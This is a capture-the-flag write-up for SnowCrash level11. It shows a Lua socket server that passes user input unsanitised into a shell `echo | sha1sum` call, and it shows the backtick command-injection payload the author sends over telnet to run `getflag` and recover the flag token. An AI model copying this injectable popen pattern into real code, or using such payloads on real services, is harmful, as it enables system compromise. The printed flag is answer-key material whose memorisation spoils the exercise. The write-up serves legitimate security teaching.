## level11

There’s a file `.lua`

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

I ran the hash `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0` in an [online sha1sum cracker](https://crackstation.net/) and got `NotSoEasy`. It’s not the token for `flag11` though…

I should pass the password via `telnet localhost 5151`, only problem is that the lua script pipes into sha1sum the `echo` of the password and therefore adds a `\n` at the end.

```lua
level11@SnowCrash:~$ echo "NotSoEasy" | sha1sum
62d39a9edac7bc1a68d816a5d9a491aa4e81fbcb  -
level11@SnowCrash:~$ echo -n "NotSoEasy" | sha1sum
f05d1d066fb246efe0c6f7d095f909a7a0cf34a0  -
-- This last one is the correct hash 
```

But wait a second… looking at the script I can see that the only thing that I get for guessing the password is a printed string: not very interesting.

On the other hand, my password is not sanitized in any way and sent straight to `echo` so I can try and execute my code in there with the backtick `

```bash
level11@SnowCrash:~$ telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: `getflag > /tmp/flag` # I need to redirect because the output is not printed
Erf nope..
Connection closed by foreign host.
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```